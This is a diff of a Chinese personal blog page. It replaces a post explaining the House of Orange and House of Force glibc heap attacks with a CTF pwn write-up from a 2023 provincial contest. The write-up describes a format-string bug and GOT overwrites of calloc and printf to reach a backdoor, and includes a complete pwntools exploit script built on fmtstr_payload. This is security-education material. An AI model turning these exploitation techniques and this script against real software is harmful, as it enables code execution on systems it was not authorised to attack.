@@ -22,25 +22,21 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="House_of_orange攻击条件能够修改到top_chunk的size值 可以得到一个unsortedbin glibc ≤ 2.23 攻击原理当malloc的值≥0x20000的时候会调用mmap来分配，而低于则会切割top_chunk来分配 当top_chunk不够分配的时候，会把当前top_chunk释放，然后再重新申请一个大的top_chunk 攻击方式看top_chunk的size">
+  <meta name="description" content="漏洞点漏洞点很多： 格式化字符串漏洞 后门 泄露libc函数等 不过值得一提的是 栈溢出是假的(那个函数返回地址由堆的一个东西管理 思路设定了函数call前RSP为0结尾，直接挟持got表改写后门函数会出现不对其错误 所以我们可以挟持两个函数，分两个函数来打，可以优秀地控制栈帧 这里挟持了一个冷门函数calloc的got表为backdoor的地址 再挟持printf为call calloc的地址即">
 <meta property="og:type" content="article">
-<meta property="og:title" content="针对topchunk的攻击">
-<meta property="og:url" content="http://example.com/2023/09/27/%E9%92%88%E5%AF%B9topchunk%E7%9A%84%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:title" content="2023福建省赛pwn wp">
+<meta property="og:url" content="http://example.com/2023/10/19/2023%E7%A6%8F%E5%BB%BA%E7%9C%81%E8%B5%9Bpwn-wp/index.html">
 <meta property="og:site_name" content="hkbin的小博客~">
-<meta property="og:description" content="House_of_orange攻击条件能够修改到top_chunk的size值 可以得到一个unsortedbin glibc ≤ 2.23 攻击原理当malloc的值≥0x20000的时候会调用mmap来分配，而低于则会切割top_chunk来分配 当top_chunk不够分配的时候，会把当前top_chunk释放，然后再重新申请一个大的top_chunk 攻击方式看top_chunk的size">
+<meta property="og:description" content="漏洞点漏洞点很多： 格式化字符串漏洞 后门 泄露libc函数等 不过值得一提的是 栈溢出是假的(那个函数返回地址由堆的一个东西管理 思路设定了函数call前RSP为0结尾，直接挟持got表改写后门函数会出现不对其错误 所以我们可以挟持两个函数，分两个函数来打，可以优秀地控制栈帧 这里挟持了一个冷门函数calloc的got表为backdoor的地址 再挟持printf为call calloc的地址即">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/images/%E9%92%88%E5%AF%B9topchunk%E7%9A%84%E6%94%BB%E5%87%BB%20f1d06547f1eb468f9311541953a1de96/Untitled.png">
-<meta property="article:published_time" content="2023-09-27T03:00:48.000Z">
-<meta property="article:modified_time" content="2023-09-27T03:06:15.685Z">
+<meta property="article:published_time" content="2023-10-19T14:35:05.000Z">
+<meta property="article:modified_time" content="2023-10-19T14:40:15.084Z">
 <meta property="article:author" content="hkbin">
-<meta property="article:tag" content="house_of">
-<meta property="article:tag" content="top_chunk">
-<meta property="article:tag" content="glibc2.23">
-<meta property="article:tag" content="glibc2.29">
+<meta property="article:tag" content="writeup">
+<meta property="article:tag" content="stack">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/images/%E9%92%88%E5%AF%B9topchunk%E7%9A%84%E6%94%BB%E5%87%BB%20f1d06547f1eb468f9311541953a1de96/Untitled.png">
 
-<link rel="canonical" href="http://example.com/2023/09/27/%E9%92%88%E5%AF%B9topchunk%E7%9A%84%E6%94%BB%E5%87%BB/">
+<link rel="canonical" href="http://example.com/2023/10/19/2023%E7%A6%8F%E5%BB%BA%E7%9C%81%E8%B5%9Bpwn-wp/">
 
 
 <script id="page-configurations">
@@ -53,7 +49,7 @@
   };
 </script>
 
-  <title>针对topchunk的攻击 | hkbin的小博客~</title>
+  <title>2023福建省赛pwn wp | hkbin的小博客~</title>
   
 
 
@@ -168,7 +164,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/09/27/%E9%92%88%E5%AF%B9topchunk%E7%9A%84%E6%94%BB%E5%87%BB/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/19/2023%E7%A6%8F%E5%BB%BA%E7%9C%81%E8%B5%9Bpwn-wp/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/header.png">
@@ -181,7 +177,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          针对topchunk的攻击
+          2023福建省赛pwn wp
         </h1>
 
         <div class="post-meta">
@@ -192,7 +188,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2023-09-27 11:00:48 / 修改时间：11:06:15" itemprop="dateCreated datePublished" datetime="2023-09-27T11:00:48+08:00">2023-09-27</time>
+              <time title="创建时间：2023-10-19 22:35:05 / 修改时间：22:40:15" itemprop="dateCreated datePublished" datetime="2023-10-19T22:35:05+08:00">2023-10-19</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -216,13 +212,13 @@
               <span class="post-meta-item-icon">
                 <i class="far fa-file-word"></i>
               </span>
-              <span>414</span>
+              <span>378</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
-              <span>2 分钟</span>
+              <span>1 分钟</span>
             </span>
 
         </div>
@@ -234,32 +230,18 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h2 id="House-of-orange"><a href="#House-of-orange" class="headerlink" title="House_of_orange"></a>House_of_orange</h2><h3 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h3><p>能够修改到top_chunk的size值</p>
-<p>可以得到一个unsortedbin</p>
-<p>glibc ≤ 2.23</p>
-<h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><p>当malloc的值≥0x20000的时候会调用mmap来分配，而低于则会切割top_chunk来分配</p>
-<p>当top_chunk不够分配的时候，会把当前top_chunk释放，然后再重新申请一个大的top_chunk</p>
-<h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><p>看top_chunk的size值，比如0x20791这样子</p>
-<p>改为0x791，再申请一个大的即可无中生有一个unsorted bin出来</p>
-<p>随后如果能够修改到unsortedbin的bk位，即可实现unsorted bin attack</p>
-<p>一般后续攻击是挟持IO_list_all指针</p>
-<p>unsorted bin attack实现的是将main_arena+0x88写到IO_list_all处</p>
-<p><img src="/./images/%E9%92%88%E5%AF%B9topchunk%E7%9A%84%E6%94%BB%E5%87%BB%20f1d06547f1eb468f9311541953a1de96/Untitled.png" alt="Untitled"></p>
-<p>此时要控制好main_arena+0x88处的IO_FILE的_chain即可(</p>
-<p>这种攻击是通过abort流攻击的(因为unsorted bin结构被破坏</p>
-<p>当再次申请内存的时候</p>
-<p>调用流为malloc→malloc→printerr→__libc_message→abort()→_IO_flush_all_lockp()→_IO_overflow</p>
-<p>但是2.27以及以后的版本取消了abort刷新流的操作，这个攻击方式就失效了(</p>
-<p>不过释放到unsorted bin这一步之前还是可以的</p>
-<h2 id="House-of-force"><a href="#House-of-force" class="headerlink" title="House of force"></a>House of force</h2><h3 id="攻击条件-1"><a href="#攻击条件-1" class="headerlink" title="攻击条件"></a>攻击条件</h3><p>能够修改到topchunk的size值</p>
-<p>glibc ≤ 2.29</p>
-<h3 id="攻击原理-1"><a href="#攻击原理-1" class="headerlink" title="攻击原理"></a>攻击原理</h3><p>修改top_chunk的size为-1，能过过掉校验</p>
-<p>然后可以通过申请内存，将top_chunk推至指定内存空间，然后malloc即可申请到那部分内存</p>
-<p>由于2.29及其以前使用，常用在2.27+的时候，可以小范围将top_chunk推至tcache struct结构体里，修改entry_point实现tcache posioning attack</p>
-<p>因为是相对位移，<strong>所以不需要leak出堆地址。</strong></p>
-<h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><p>比如当前top_chunk_addr &#x3D; 0x501000</p>
-<p>malloc(-0x1000)即可将top_chunk_addr推至0x500000附近</p>
-
+        <h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>漏洞点很多：</p>
+<p>格式化字符串漏洞</p>
+<p>后门</p>
+<p>泄露libc函数等</p>
+<p>不过值得一提的是 栈溢出是假的(那个函数返回地址由堆的一个东西管理</p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>设定了函数call前RSP为0结尾，直接挟持got表改写后门函数会出现不对其错误</p>
+<p>所以我们可以挟持两个函数，分两个函数来打，可以优秀地控制栈帧</p>
+<p>这里挟持了一个冷门函数calloc的got表为backdoor的地址</p>
+<p>再挟持printf为call calloc的地址即可</p>
+<p>栈上的格式化字符串的打法比较简单，这里就不多说了</p>
+<p>用好fmtstr_payload可以事半功倍</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> gift</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>,<span class="string">&quot;splitw&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc_name = <span class="string">&quot;&quot;</span></span><br><span class="line">remote_ip = <span class="string">&quot;&quot;</span></span><br><span class="line">remote_port = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># libc = ELF(libc_name)</span></span><br><span class="line"></span><br><span class="line">mode = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: p.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: p.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: p.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: p.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> mode:</span><br><span class="line">    p = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(filename)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bpp</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">log</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\x1B[36m&#123;&#125;\x1B[0m&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>():</span><br><span class="line">    leak_dat = ru(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:]</span><br><span class="line">    <span class="keyword">return</span> u64(leak_dat.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;choose:&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Repeater</span>(<span class="params">payload</span>):</span><br><span class="line">    sla(prefix, <span class="built_in">str</span>(<span class="number">4294967293</span>))</span><br><span class="line">    sa(<span class="string">&quot;You find a Repeater!&quot;</span>, payload + <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chance</span>(<span class="params">payload</span>):</span><br><span class="line">    sla(prefix, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    s(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gift</span>():</span><br><span class="line">    sla(prefix, <span class="built_in">str</span>(<span class="number">10086</span>))</span><br><span class="line">    ru(<span class="string">&quot;Everyone is tired and reduces the workload!&quot;</span>)</span><br><span class="line"></span><br><span class="line">gift()</span><br><span class="line">rl()</span><br><span class="line">puts_got = <span class="built_in">int</span>(rl().decode()[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">log(<span class="built_in">hex</span>(puts_got))</span><br><span class="line"></span><br><span class="line">offset = <span class="number">6</span></span><br><span class="line">ret_addr = <span class="number">0x401522</span></span><br><span class="line">backdoor = <span class="number">0x401514</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">pad = fmtstr_payload(offset, &#123;elf.got[<span class="string">&#x27;calloc&#x27;</span>]: backdoor&#125;)</span><br><span class="line"></span><br><span class="line">Repeater(pad)</span><br><span class="line"></span><br><span class="line">pad = fmtstr_payload(offset, &#123;elf.got[<span class="string">&#x27;printf&#x27;</span>]: <span class="number">0x40153D</span>&#125;)</span><br><span class="line"></span><br><span class="line">bpp()</span><br><span class="line">Repeater(pad)</span><br><span class="line"><span class="comment"># bpp()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rl()</span></span><br><span class="line"><span class="comment"># raw = rl()</span></span><br><span class="line"><span class="comment"># log(raw)</span></span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>
     </div>
 
     
@@ -268,10 +250,8 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/house-of/" rel="tag"># house_of</a>
-              <a href="/tags/top-chunk/" rel="tag"># top_chunk</a>
-              <a href="/tags/glibc2-23/" rel="tag"># glibc2.23</a>
-              <a href="/tags/glibc2-29/" rel="tag"># glibc2.29</a>
+              <a href="/tags/writeup/" rel="tag"># writeup</a>
+              <a href="/tags/stack/" rel="tag"># stack</a>
           </div>
 
         
@@ -280,13 +260,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2023/09/26/house-of-husk/" rel="prev" title="house_of_husk">
-      <i class="fa fa-chevron-left"></i> house_of_husk
+    <a href="/2023/10/17/2023-%E9%A6%99%E5%B1%B1%E6%9D%AFpwn-wp/" rel="prev" title="2023 香山杯pwn wp">
+      <i class="fa fa-chevron-left"></i> 2023 香山杯pwn wp
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2023/09/30/%E5%85%B3%E9%97%ADaslr%E8%BF%9B%E8%A1%8C%E8%B0%83%E8%AF%95/" rel="next" title="关闭aslr进行调试">
-      关闭aslr进行调试 <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -345,7 +322,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#House-of-orange"><span class="nav-number">1.</span> <span class="nav-text">House_of_orange</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%9D%A1%E4%BB%B6"><span class="nav-number">1.1.</span> <span class="nav-text">攻击条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="nav-number">1.2.</span> <span class="nav-text">攻击原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="nav-number">1.3.</span> <span class="nav-text">攻击方式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#House-of-force"><span class="nav-number">2.</span> <span class="nav-text">House of force</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%9D%A1%E4%BB%B6-1"><span class="nav-number">2.1.</span> <span class="nav-text">攻击条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86-1"><span class="nav-number">2.2.</span> <span class="nav-text">攻击原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95"><span class="nav-number">2.3.</span> <span class="nav-text">攻击方法</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="nav-number">1.</span> <span class="nav-text">漏洞点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">2.</span> <span class="nav-text">思路</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
